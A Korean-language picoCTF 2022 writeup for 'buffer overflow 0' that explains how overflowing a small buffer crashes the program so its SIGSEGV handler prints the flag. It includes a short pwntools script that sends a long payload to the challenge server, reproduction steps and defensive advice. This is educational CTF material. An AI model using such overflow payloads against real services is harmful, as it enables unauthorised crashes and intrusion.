---
title: buffer overflow 0 — picoCTF 2022 pwn writeup
created: 2026-06-15
updated: 2026-06-21
type: query
tags: [ctf, pwn, buffer-overflow, gets, strcpy, sigsegv, picoctf]
sources: [https://medium.com/@muranyi.levente/picoctf-2022-buffer-overflow-0-f26e5fc9b31e, https://dev.to/shalintha/exploiting-buffer-overflow-0-step-by-step-picoctf-walkthrough-p83, https://medium.com/@hchilcote/picoctf-buffer-overflow-0-write-up-82dc8ea3bea0]
confidence: high
---

# buffer overflow 0 — picoCTF 2022 pwn writeup

> `buffer overflow 0`는 **작은 버퍼를 overflow해 `sigsegv_handler`를 실행시키면 flag를 출력하는 picoCTF 2022 Binary Exploitation 문제**입니다. 일반적인 ret2win이 아니라 **의도적 크래시**가 핵심입니다.

## 참고 URL
- [medium.com](https://medium.com/@muranyi.levente/picoctf-2022-buffer-overflow-0-f26e5fc9b31e)
- [dev.to](https://dev.to/shalintha/exploiting-buffer-overflow-0-step-by-step-picoctf-walkthrough-p83)
- [medium.com](https://medium.com/@hchilcote/picoctf-buffer-overflow-0-write-up-82dc8ea3bea0)


## 1. 핵심 요약

- 바이너리는 **32-bit x86**입니다.
- `gets()`와 `strcpy()` 같은 unsafe API가 사용됩니다.
- 입력이 짧으면 `vuln()`에서 잘 동작하지만, 길게 보내면 **segmentation fault**가 발생합니다.
- 프로그램은 이 크래시를 잡아 처리하는 **sigsegv_handler**를 가지고 있고, 그 handler가 flag를 출력합니다.
- 오프셋 계산이나 RIP/EIP 제어가 필요하지 않습니다.

## 2. 문제 구조

| 항목 | 내용 |
|------|------|
| 플랫폼 | picoCTF 2022 |
| 분류 | pwn / intentional crash |
| 아키텍처 | 32-bit x86 |
| 핵심 요소 | unsafe copy, signal handler |
| 오프셋 | 불필요 |
| 목표 | segfault 유도 후 handler 실행 |

## 3. 공격 흐름

1. `main()`에서 입력을 받습니다.
2. 입력이 작은 버퍼로 복사되며 overflow가 발생할 수 있습니다.
3. 충분히 긴 입력을 보내 프로그램을 크래시시킵니다.
4. `sigsegv_handler`가 실행됩니다.
5. handler가 flag를 출력합니다.

## 4. 왜 가능한가

이 문제는 제어 흐름을 직접 탈취하는 대신, **예외 처리 경로를 목표로 하는 문제**입니다. 즉, “정상 종료”가 아니라 “특정 크래시를 유발하면 오히려 flag를 준다”는 구조입니다. 실무 관점에서는 매우 위험한 패턴이지만, CTF에서는 학습용 장치로 자주 등장합니다.

## 5. 익스플로잇 예시

```python
from pwn import *  # pwntools를 불러옵니다.

elf = context.binary = ELF('./vuln')  # 바이너리를 로드합니다.

# 로컬/원격 실행을 선택하는 헬퍼입니다.
def start():
    if args.REMOTE:
        return remote('saturn.picoctf.net', 12345)  # 원격 서비스 예시입니다.
    return process(elf.path)  # 로컬에서 실행합니다.

io = start()

payload = cyclic(200)  # 긴 cyclic 패턴으로 overflow를 유도합니다.
io.sendlineafter(b':', payload)  # 입력을 보냅니다.

# 크래시 후 handler가 출력하는 flag를 읽습니다.
print(io.recvall().decode(errors='replace'))
```


## 재현 절차

1. 실행 파일 형식과 보호기법을 확인합니다.
```bash
# 32-bit x86 여부와 보호기법을 먼저 확인합니다.
file ./vuln              # 예상: ELF 32-bit LSB executable
checksec --file=./vuln    # 예상: NX / Canary / PIE 상태가 출력됩니다.
```
2. 긴 입력으로 의도적 크래시를 유도합니다.
```python
# 긴 페이로드를 만들어 segfault를 유도합니다.
payload = b"A" * 200     # 예상: 버퍼 overflow가 발생합니다.
print(payload.decode())   # 예상: A가 200개 출력됩니다.
```
3. 크래시 이후 `sigsegv_handler`가 flag를 출력하는지 확인합니다.
## 6. 방어 관점 메모

- `gets()`와 `strcpy()`는 즉시 제거해야 합니다.
- 크래시를 유발하면 예외 처리 경로가 동작하는 구조는 위험합니다.
- signal handler에서 민감 정보를 출력하지 않아야 합니다.
- 입력 제한과 안전한 복사 API 사용이 필수입니다.

## 7. 비교 포인트

- `buffer overflow 1`은 **saved return address overwrite**입니다.
- `buffer overflow 2`는 **ret2win with arguments**입니다.
- `buffer overflow 3`는 **stack canary brute force**입니다.
- `buffer overflow 0`은 **의도적 크래시 + signal handler**입니다.

## 8. 참고 자료

- [PicoCTF 2022: Buffer Overflow 0 — Medium](https://medium.com/@muranyi.levente/picoctf-2022-buffer-overflow-0-f26e5fc9b31e)
- [Exploiting Buffer Overflow 0 Step-by-Step | picoCTF Walkthrough](https://dev.to/shalintha/exploiting-buffer-overflow-0-step-by-step-picoctf-walkthrough-p83)
- [PicoCTF Buffer Overflow 0 Write Up](https://medium.com/@hchilcote/picoctf-buffer-overflow-0-write-up-82dc8ea3bea0)
- [[intentional-crash-signal-handler-ctf-patterns]]
- [[saved-return-address-control-ctf-patterns]]
